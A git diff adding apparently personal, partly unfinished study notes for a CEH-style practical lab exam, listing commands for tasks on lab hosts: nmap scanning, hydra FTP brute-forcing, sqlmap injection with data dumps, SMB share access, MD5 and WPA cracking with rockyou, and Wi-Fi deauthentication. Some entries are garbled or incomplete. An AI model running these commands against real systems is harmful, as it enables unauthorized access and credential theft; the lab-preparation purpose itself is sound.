@@ -18,9 +18,148 @@ Decrypt the Encoded Secret:
 
 Use the password to decrypt the encoded file (e.g., with openssl or gpg).
 
- @Forensic Analysis of an Image File for Hidden Data@
+ #Forensic Analysis of an Image File for Hidden Data#
 exiftool MyTrip.jpg
 steghide extract -sf MyTrip.jpg
+
+#Exploit Weak Credentials for FTP Service on a Windows Machine#
+nmap -p 21 192.168.0.0/24 --open -sV
+Look for the IP address where the FTP service is running
+Replace <target_IP> with the IP address found in the nmap scan.
+hydra -L userlist.txt -P passlist.txt ftp://<target_IP>
+
+
+Scan for FTP Service:
+
+Use nmap to scan the 192.168.0.0/24 subnet to find a machine running FTP (port 21).
+
+-> nmap -p 21 192.168.0.0/24 --open -sV
+
+Look for the IP address where the FTP service is running.
+
+Use hydra to brute-force the FTP credentials. Create a list of potential usernames and passwords or use a commonly available list (e.g., rockyou.txt).
+
+-> hydra -L userlist.txt -P passlist.txt ftp://<target_IP>
+
+-> ftp <target_IP>
+->get Credentials.txt
+->cat Credentials.txt
+
+#Analyze Suspicious Executable for Entry Point Address#
+smbclient \\\\EH-Workstation-2\\C$ -U Admin
+get "C:\Users\Admin\Documents\die-another-da"
+exiftool die-another-da
+objdump -x die-another-da | grep "Entry point"
+gdb die-another-da
+The output will display the entry point address. Record this value as your answer.
+
+ #Analyze Network Capture for DDoS Attack#
+open wiresharek and open file 
+and go to statistics and 
+
+
+
+$perform sql injectiosn sarah$
+firefox http://cinema.cehorg.com
+sqlmap -u "http://cinema.cehorg.com/target_page" --data="username=Karen&password=computer" --batch --dump
+
+
+$Exploiting a Web Application to Find a Flag$
+curl -X GET "http://www.cehorg.com?page_id=84"
+This command will return the contents of the page with page_id=84. You may modify the page_id parameter to test different values and observe changes in the response.
+
+
+If the page_id parameter is vulnerable to SQL injection:
+
+sqlmap -u "http://www.cehorg.com?page_id=84" --batch --dump
+
+ #Exploiting a Web Application#
+
+sqlmap -u "http://192.168.0.64/vulnerable_page.php?id=1" --dbs
+wget http://192.168.0.64/path/to/Flag.txt
+cat Flag.txt
+
+
+
+Task 15: Perform SQL injection attack on a web application cybersec.cehorg.com, available at 172.20.0.22. Find the value in the Flag column in one of the DB tables and enter it as the answer.
+Target URL: http://172.20.0.22.
+Use sqlmap to automate SQL injection and find the flag.
+
+sqlmap -u "http://172.20.0.22/vulnerable_page.php?id=1" --dump
+
+
+Task 16: Cracking MD5 Hash
+wget http://172.20.0.16:8080/DVWA/HackableUploads/filename
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
+
+
+Task 17: Analyze the traffic capture from an IoT network located in the hidden folders of the CEH Workstation - 1 (Parrot Security) machine, identify the packet with IoT Publish Messag
+Access the IoT network traffic capture file.
+Use a tool like Wireshark or tcpdump.
+
+->  tcpdump -r capture.pcap
+Analyze the traffic for the IoT Publish Message and find the relevant information.
+
+Task 18: Cracking Wireless Encryption
+
+
+airodump-ng wlan0mon
+aireplay-ng -0 10 -a [BSSID] wlan0mon
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capturefile.cap
+
+
+
+task 19 A disgruntled ex-employee has hidden a server access code in a Windows machine in the 192.168.0.0/24 subnet. You cannot physically access the target machine, but you know that the organization uses it for administration purposes.
+
+Identify the target machine:
+
+Use nmap to scan the subnet and identify the Windows machine.
+Example command:
+bash
+Copy code
+nmap -p 445 --open -sS 192.168.0.0/24
+Look for a host with port 445 open (indicating SMB).
+Access the machine via SMB:
+
+Once you identify the IP address, connect to the machine using the smbclient tool.
+Example command:
+bash
+Copy code
+smbclient -L \\192.168.0.X -U guest
+If you find shared directories, connect to the one where the file might be located.
+Example:
+bash
+Copy code
+smbclient \\\\192.168.0.X\\share_name -U guest
+Search for the sa_code.txt file:
+
+Navigate through the shared directories and search for sa_code.txt.
+Example commands:
+bash
+Copy code
+cd path/to/directory
+ls
+Download and read the file:
+
+Once you locate the sa_code.txt file, download it.
+Example command:
+bash
+Copy code
+get sa_code.txt
+Open the file to retrieve the server access code.
+Example:
+bash
+Copy code
+cat sa_code.txt
+Submit the string in the file as the answer.
+
+20 A disgruntled employee of your target organization has stolen the company’s trade secrets and encrypted them using VeraCrypt. The VeraCrypt volume file "Secret" is stored on the C: drive of the "EH Workstation – 2" machine
+
+
+ use veracytp
+
+
+
 
 
 
